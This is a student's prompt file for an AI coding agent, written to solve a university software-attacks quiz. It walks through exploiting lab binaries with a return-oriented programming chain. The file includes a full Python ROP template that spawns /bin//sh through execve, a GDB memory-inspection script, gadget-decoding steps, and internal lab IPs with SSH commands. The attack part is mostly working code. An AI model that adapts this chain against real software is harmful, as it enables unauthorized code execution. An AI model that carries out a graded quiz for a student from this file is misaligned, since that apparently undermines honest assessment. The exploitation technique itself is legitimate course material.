# Quiz 4 — Next Session Prompt (Quiz Day, Group 6)

Paste this entire file as your first message to Claude Code on quiz day.

---

## Context

EPL326 Software Attacks, University of Cyprus — Quiz 4.
I am student apieri01, group 6. I have already solved the 4 example binaries (bin2 set + g1 set).
On quiz day I will receive 2 new binaries (group 6 set). Apply the **exact same methodology** as before.

All solved examples and tools are in: `C:\Users\andre\Desktop\quiz_4_universal\`

---

## SSH Connection

### On Quiz Day: lab-to-lab (from your assigned lab machine → 103ws)
The quiz binaries are on 103wsX machines. From your assigned lab machine:
```bash
# SSH key is in NFS home (~/.ssh/lab_key) — same key works from any lab machine
ssh -i ~/.ssh/lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.89
# If 10.16.13.89 (103ws14) is down, try: 10.16.13.88, 10.16.13.90, etc.
# No VPN needed — you're already on the internal network
```

Copy files from your lab machine to 103ws:
```bash
scp -i ~/.ssh/lab_key /path/to/script.py apieri01@10.16.13.89:~/script.py
```

Or clone this repo directly on 103ws:
```bash
git clone https://github.com/andreas1612/326_quiz3.git ~/quiz4
# Then use ~/quiz4/tools/find_gadgets.py and solve_rop_template.py
```

### From Windows (prep/home):
```powershell
# From PowerShell (NOT Git Bash or WSL — they mangle quotes/paths)
ssh -i C:\Users\andre\.ssh\lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.89
scp -i C:\Users\andre\.ssh\lab_key C:\tmp\script.py apieri01@10.16.13.89:~/script.py
```

---

## What Was Already Solved

All 4 example binaries → `uid=9992(apieri01)` confirmed:

| Binary | Set | OFFSET | gadget_base |
|--------|-----|--------|-------------|
| bin.1 | bin2 | 56 | 0x070493e0 |
| bin.2 | bin2 | 56 | 0x070493e0 |
| bin.1 | g1 | 52 | 0x070493e0 |
| bin.2 | g1 | 52 | 0x070493e0 |

Exploit scripts on lab: `~/fix_g1.py`, `~/solve_final.sh`

---

## Key Confirmed Values (from GDB)

```
mmap_base   = 0x07049000
gadget_base = 0x070493e0   ← empirical (formula gives 0x070493e8, off by 8)
WR_ADDR     = 0x07049500   ← mmap_base + 0x500 (MAP_ANONYMOUS zeroed)
```

The mmap_base formula (for reference):
```python
hardcoded_addr = 0x0804942a  # push before mmap in main()
pagesize = 0x1000
mmap_base = (hardcoded_addr // pagesize - 0x1000) * pagesize  # 0x07049000
# Then gadget_base = mmap_base + offset(TEMP) where TEMP=1000
# offset() loop: while x > 0x3e8: x -= 0x64; return x → gives 0x3e8
# But actual is +0x3e0 — ALWAYS verify via GDB!
```

---

## Step-by-Step Solve Methodology

### Step 0 — Get tools and binaries on 103ws

**On quiz day (from your lab machine):**
```bash
# Clone repo to get tools (or it may already be there from prep)
git clone https://github.com/andreas1612/326_quiz3.git ~/quiz4
mkdir -p ~/quiz4_examples/g6

# Copy quiz binaries to 103ws (binaries are given to you on your assigned machine)
scp -i ~/.ssh/lab_key bin.1 bin.2 apieri01@10.16.13.89:~/quiz4_examples/g6/

# Or if binaries are already on 103ws in your home dir, just use them directly
```

### Step 1 — Recon
```bash
cd ~/quiz4_examples
readelf -l g6/bin.1 | grep GNU_STACK   # RW = NX on (need ROP)
readelf -h g6/bin.1 | grep Type        # EXEC = no PIE
objdump -d g6/bin.1 | grep -E "^[0-9a-f]+ <"  # list functions
```

### Step 2 — Confirm mmap+movb pattern
```bash
objdump -d g6/bin.1 | sed -n '/<main>/,/^$/p' | grep -E "mmap|movb" | head -20
```
Expected: `mmap` call + many `movb $0xNN, offset(%eax)` instructions.

### Step 3 — Run find_gadgets.py
```bash
python3 ~/tools/find_gadgets.py g6/bin.1
python3 ~/tools/find_gadgets.py g6/bin.2
```
Gadgets will show NOT FOUND (they're dynamic). Use the `.data` address shown as WR_ADDR fallback if needed, but prefer mmap_base+0x500.

### Step 4 — Decode movb table (gadget order)
```bash
# Extract movb bytes from main — gives the order gadgets are written
objdump -d g6/bin.1 | awk '/<main>/{f=1} f{print} /^$/{if(f)exit}' | grep "movb"
```
Or more reliably:
```bash
objdump -d g6/bin.1 | grep -A200 "<main>:" | grep "movb" | head -30
```

Decode each `movb $0xNN, 0xOFFSET(%eax)` line:
- Group by target offset (0, 1, 2 per gadget slot)
- Each 3-byte group = one gadget
- OFFSET order determines gadget address order at gadget_base

Known gadget byte patterns:
```
31 c0 c3  → xor eax,eax; ret
58 5b c3  → pop eax; pop ebx; ret
89 03 c3  → mov [ebx],eax; ret
31 c9 c3  → xor ecx,ecx; ret
89 c3 c3  → mov ebx,eax; ret
31 d2 c3  → xor edx,edx; ret
b0 0b c3  → mov al,0xb; ret
cd 80 c3  → int 0x80; ret
```

### Step 5 — Find OFFSET (buffer overflow size)
```bash
objdump -d g6/bin.1 | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep "lea"
```
Find `lea -0xNN(%ebp),%eax` just before `call memcpy`.
**OFFSET = NN + 4** (the +4 accounts for saved EBP).

Common values seen: 56 (from -0x34) or 52 (from -0x30). Check both bin.1 and bin.2 separately!

### Step 6 — Verify gadget_base via GDB

Write this to `C:\tmp\gdb_verify.py` then SCP to lab:
```python
import gdb
gdb.execute("set pagination off")
gdb.execute("b *0x8049376")   # after memcpy in display_file
gdb.execute("run g6/exploit.1")
ebp = int(gdb.parse_and_eval("$ebp"))
print("EBP = %s" % hex(ebp))
for i in range(0, 32, 4):
    addr = 0x070493e0 + i
    try:
        v = int(gdb.parse_and_eval("*((unsigned int*)%d)" % addr))
        b = v.to_bytes(4, 'little')
        print("0x%08x: %s" % (addr, ' '.join('%02x'%x for x in b)))
    except:
        print("0x%08x: ERROR" % addr)
gdb.execute("quit")
```
Run:
```bash
# Create a dummy exploit first (any file of correct length) then:
python3 -c "print('60 ' + 'A'*60)" > g6/exploit.1
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb \
  gdb -batch -ex "source /tmp/gdb_verify.py" g6/bin.1 2>&1 | grep -E "EBP|0x070"
```

**NOTE**: The breakpoint address 0x8049376 is from `display_file` after memcpy. If it's different for the quiz binaries, find it:
```bash
objdump -d g6/bin.1 | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep -A2 "memcpy"
```

### Step 7 — Build ROP chain

Write `C:\tmp\solve_g6.py`:
```python
#!/usr/bin/env python3
import struct

def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)

gb = 0x070493e0       # confirm via GDB!
WR_ADDR = 0x07049500  # mmap_base + 0x500

# Fill these in after decoding movb table:
OFFSET = 56           # from Step 5
G_POP_EAX_POP_EBX = gb + ???   # 58 5b c3
G_MOV_EBXPTR_EAX  = gb + ???   # 89 03 c3
G_MOV_EBX_EAX     = gb + ???   # 89 c3 c3
G_XOR_ECX_ECX     = gb + ???   # 31 c9 c3
G_XOR_EDX_EDX     = gb + ???   # 31 d2 c3
G_XOR_EAX_EAX     = gb + ???   # 31 c0 c3
G_MOV_AL_0B       = gb + ???   # b0 0b c3
G_INT_80          = gb + ???   # cd 80 c3

chain  = b'A' * OFFSET
chain += p32(G_POP_EAX_POP_EBX) + b'/bin' + p32(WR_ADDR)   + p32(G_MOV_EBXPTR_EAX)
chain += p32(G_POP_EAX_POP_EBX) + b'//sh' + p32(WR_ADDR+4) + p32(G_MOV_EBXPTR_EAX)
chain += p32(G_POP_EAX_POP_EBX) + p32(WR_ADDR) + p32(0x41414141) + p32(G_MOV_EBX_EAX)
chain += p32(G_XOR_ECX_ECX)
chain += p32(G_XOR_EDX_EDX)
chain += p32(G_XOR_EAX_EAX)
chain += p32(G_MOV_AL_0B)
chain += p32(G_INT_80)

data = str(len(chain)).encode() + b' ' + chain
with open('g6/exploit.1', 'wb') as f:
    f.write(data)
print('[+] exploit.1 written, payload length:', len(chain))
```

SCP and run:
```powershell
scp -i C:\Users\andre\.ssh\lab_key C:\tmp\solve_g6.py apieri01@10.16.13.89:~/solve_g6.py
```
```bash
cd ~/quiz4_examples && python3 ~/solve_g6.py
```

### Step 8 — Verify
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g6/bin.1 g6/exploit.1
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g6/bin.2 g6/exploit.2
```
Expected output: `uid=XXXX(apieri01)` or similar.

---

## Quick Gadget Decode Cheatsheet

Given movb output like:
```
movb $0x31, 0x0(%eax)   # byte 0 of slot 0
movb $0xc0, 0x1(%eax)   # byte 1 of slot 0
movb $0xc3, 0x2(%eax)   # byte 2 of slot 0
movb $0x58, 0x3(%eax)   # byte 0 of slot 1
movb $0x5b, 0x4(%eax)   # byte 1 of slot 1
movb $0xc3, 0x5(%eax)   # byte 2 of slot 1
...
```
→ Slot 0 at `gb+0x00` = `31 c0 c3` = xor_eax  
→ Slot 1 at `gb+0x03` = `58 5b c3` = pop_pop  

Each slot is 3 bytes. 8 gadgets × 3 = 24 bytes total.

---

## Critical Pitfalls

1. **Gadget ORDER differs between bin.1 and bin.2** — decode movb table fresh for each binary
2. **OFFSET differs between binaries** — always check `lea -0xNN(%ebp)` in display_file for each binary
3. **gadget_base formula ≈ correct but verify via GDB** — was off by 8 in examples (0x3e8 vs 0x3e0)
4. **Never use .bss as WR_ADDR** — bin.2 variants have init_data() that poisons .bss with 0xffffffff
5. **File format**: `"SIZE PAYLOAD"` — `str(len(chain)).encode() + b' ' + chain`
6. **Use PowerShell for SSH/SCP** — Git Bash/WSL mangle quotes and interpret `<` as redirects
7. **EBP-based OFFSET**: `lea -0x34(%ebp)` → buf starts at ebp-0x34 → overflow needs 0x34+4=56 bytes
